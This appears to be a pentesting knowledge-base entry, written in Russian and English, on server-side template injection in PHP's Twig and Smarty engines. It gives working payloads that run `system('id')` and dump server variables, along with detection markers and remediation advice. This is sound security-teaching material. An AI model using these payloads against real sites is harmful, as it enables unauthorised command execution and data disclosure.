---
id: ssti-php-twig-smarty
title: "SSTI (PHP): Twig и Smarty"
type: ssti
target: php
category: web
difficulty: intermediate
bypass: none
tags: [ssti, php, twig, smarty]
tested_on: ["Twig 2.x/3.x", "Smarty 3.x"]
success_rate: 0.4
risk: high
cwe: "CWE-1336"
lab: null
last_verified: "2026-10-23"
references:
  - "https://portswigger.net/web-security/server-side-template-injection"
graph:
  - target: "ssti"
    type: instance_of
  - target: "rce"
    type: leads_to
  - target: "info-disclosure"
    type: leads_to
---

# SSTI (PHP): Twig и Smarty

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
```

## Explanation

Twig до 1.28 позволял через `_self.env` зарегистрировать произвольный callback
и вызвать его — прямой путь к `system()`. В новых версиях `_self.env` удалён,
но остаются векторы через `{{7*7}}`, `{{app.request.server.all}}` (раскрытие переменных),
и (при sandbox off) `{{['id']|map('system')|join}}`.
Smarty уязвим при `{php}`-тегах или `{$smarty.version}` + `{if}` с PHP-функциями
в старых конфигурациях; актуальный вектор — `{fetch}`/`{mailto}` с параметрами.

## Detection

Маркеры: `{{...}}` вычисляется (`49`), `{$smarty.version}` возвращает версию Smarty,
ошибка `Unknown "..." filter` (Twig). Раскрытие окружения: `{{app.request.server.all|join(',')}}`.

## Remediation

- Никогда не передавать пользовательский ввод в `createTemplate()`/`render()` как шаблон.
- Twig: `sandbox` extension + whitelist фильтров/функций; актуальная версия.
- Smarty: `$smarty->enableSecurity()` с политикой, запрет `{php}`, `{include}` из ввода.
- Рендер шаблонов в отдельном процессе с минимальными правами.

## Variants

```
{{['id']|map('system')|join}}
```

```
{{app.request.server.all|join(',')}}
```

```
{$smarty.version}
```
